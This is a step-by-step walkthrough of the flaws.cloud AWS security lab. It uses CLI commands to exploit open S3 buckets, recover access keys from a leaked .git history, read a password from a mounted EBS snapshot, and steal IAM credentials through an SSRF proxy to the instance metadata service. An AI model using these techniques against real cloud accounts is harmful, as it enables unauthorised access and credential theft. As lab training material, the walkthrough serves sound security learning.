<h2>All 6 challenges for this lab can be found at http://flaws.cloud</h2>

<h3>Level 1 target: flaws.cloud</h3>

Step 1: Run nslookup flaws.cloud<br>
This returns 52.92.154.227

Step 2: Run nslookup on 52.92.154.227  <br>
This returns s3-website-us-west-2.amazonaws.com

Step 3: Now that we know that our target is a s3 bucket, let’s check for anonymous access: <br>
aws s3 ls s3://flaws.cloud --no-sign-request

The page returns a listing of the s3 bucket.

Step 4: Download the secret to our terminal by running the command: <br>
aws s3 cp s3://flaws.cloud/secret-dd02c7c.html . --no-sign-request

Step 5: Opening the secret shows we have passed level 1:

---
<h3>Level 2 target: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/ </h3>

Step 1: Run nslookup on level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud <br>
This returns 52.92.200.145 <br>

Step 2: Run nlookup on 52.92.200.145 <br>
This returns s3-us-west-2-w.amazonaws.com

Step 3: Now that we know that our target is a s3 bucket, let’s check for anonymous access: <br>
aws s3 ls s3:// level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --no-sign-request <br>
This time this request returns an ‘Access denied’. 

Step 4: Check for a misconfiguration of enabling "Any Authenticated AWS User" to list the bucket.<br>
To do this we will first need to create an aws user (can use an aws free account to create this user) and then create access keys for this user.  

Once we have an aws user and created access keys, run the command: aws configure --profile testing <br>
When prompted, enter the access keys.

Next, list the s3 bucket with the user we configured: aws --profile testing s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud 

This returns a s3 bucket list.

Step 5: Download the secret to our terminal by running the command: <br>
aws --profile testing s3 cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html .

Step 6: Opening the secret shows we have passed level 2:

---

<h3>Level 3 target: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</h3>

Step 1: Run nslookup on level3-9afd3927f195e10225021a578e6f78df.flaws.cloud <br>
This returns 52.92.242.211

Step 2: Run nlookup on 52.92.242.211 <br>
This returns s3-website-us-west-2.amazonaws.com

Step 3: Now that we know that our target is a s3 bucket we can test the misconfigurations in level 1 and level 2.  Test for anonymous access to this bucket by running: <br> aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud 

This returns a listing of the s3 bucket.

Step 4: Download the .git repository to our terminal:  <br>
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git . --no-sign-request 

Step 5: Run ‘git log’ and then ‘git diff’ on the 2 logs.

This shows an aws access key and secret access key (this is like a username and password).  

Step 6: Run the command: aws configure --profile testing2 <br>
When prompted, enter the access keys.

Step 7: Check if this profile has any s3 buckets: aws --profile testing2 s3 ls

This returned a number of s3 buckets.  

Step 8: Navigate to level 4 by visiting http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud 

---

<h3>Level 4 target: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud </h3>

Step 1: Navigating to http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/ requires a username and password.  

Since we are told that the target is an ec2 instance, let’s check if it has any snapshots: aws --profile testing2 ec2 describe-snapshots

This returned a lot of snapshots, so pipe the output into a file.  

Step 2:  Check for backups with: grep -i backup file.txt <br>
That should find a snapshot of "snap-0b49342abd1bdcb89" (unfortunately there is currently an issue where this snapshot is not in the output to the describe-snapshots command).

Step 3: Mount this snapshot on our own ec2 instance to see the snapshot data.  To do this, first create a new volume on our own user (to do this we can use the aws free account we created earlier): aws --profile testing ec2 create-volume --snapshot-id snap-0b49342abd1bdcb89 --availability-zone us-west-2a --region us-west-2  

*Need to guess the correct region until the command works, there aren’t that many US regions so it doesn't take long to guess the correct region.

Next, create an ec2 instance on our free aws user account and attach this volume to that ec2. <br>

Next, ssh into the ec2 instance we created, run the command 'lsblk' to find the attached volume, and then mount the volume by running: sudo mount /dev/xvda /mnt 

Step 4: Go to /mnt and look around for credentials.  Checking in /home/ubuntu/.bash_history shows a username and password of: flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M

Step 5: Use these credentials to login to http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud to complete level 4.

---
<h3>Level 5 target: http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/</h3>

Step 1: If you can make any sort of HTTP request from an EC2 to an IP of 169.254.169.254, you'll likely get back information the owner would prefer you not see.  169.254.169.254 is a well known IP in the cloud world, in AWS it used to retrieve user data and instance metadata specific to an instance.  Check this by navigating to http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ 

This url shows an accesskeyid and a secretaccesskey. 

Step 2: Configure a user profile with these keys: aws configure --profile testing3 <br>
When prompted, enter the access keys and then manually enter into ~/.aws/credentials into testing3 the aws_session_token (that’s the ‘Token’ value).  

Step 3: Check if can use this profile to list the s3 bucket: aws --profile testing3 s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud  

This shows the listing for the bucket.

Step 4: Download the bucket directory: aws --profile testing3 s3 sync s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/ .

Step 5: Opening the downloaded file inside this directory completes level 5.

---
<h3>Level 6 Target</h3>

Step 1: Configure a new profile with these access keys.  Since we have previously seen the target use the region of us-west-2, when we configure the user we will set this same region for the user.  

Step 2: Find out who this user is: aws --profile testing4 iam get-user

Step 3: Now that we know we are the user called “Level6”, find what policies this user has: <br>
aws --profile testing4 iam list-attached-user-policies --user-name Level6

The policy list_apigateways is a custom policy.  Custom policies are interesting as they have a greater chance of containing misconfigurations or insecurities.  

Step 4: Check the details for the list_apigateways policy: aws --profile testing4 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways

This shows it’s using version 4.  

Step 5: Now that we have the ARN and the version id, we can see what the actual policy is: aws --profile testing4 iam get-policy-version  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4

This shows that we can use this policy to call "apigateway:GET" on "arn:aws:apigateway:us-west-2::/restapis/*"   <br>
A quick google search for ‘aws how to invoke api’ shows the information we need in order to invoke the api:

Step 6: Let's look around and see what else this user might have and see if we can find the information we need in order to invoke the api.  Check if there are any lambda functions associated to this user that are using this api: aws --profile testing4 lambda list-functions

This shows there’s a lambda function called “Level6”.

Step 7: Check the details for this lambda function: aws --profile testing4 lambda get-policy --function-name Level6|sed -z 's/,/\n/g'

The line showing “arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6” is a pattern for API Gateway ARNs, where “s33ppypa75” is the API Gateway API ID and “GET/level6” specifies the HTTP method (GET) and resource path (/level6). <br>
The only missing piece for invoking the api is the stage name.  

Step 8: To get the stage name: aws --profile testing4 apigateway get-stages --rest-api-id "s33ppypa75"

This shows that the stageName is “Prod”.

Step 9: Now that we have all the data we need to invoke the api, let’s put it all together and visit the url: https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6 

Step 10: Visit the url the api shows: http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b 

Visiting this url solves level 6.

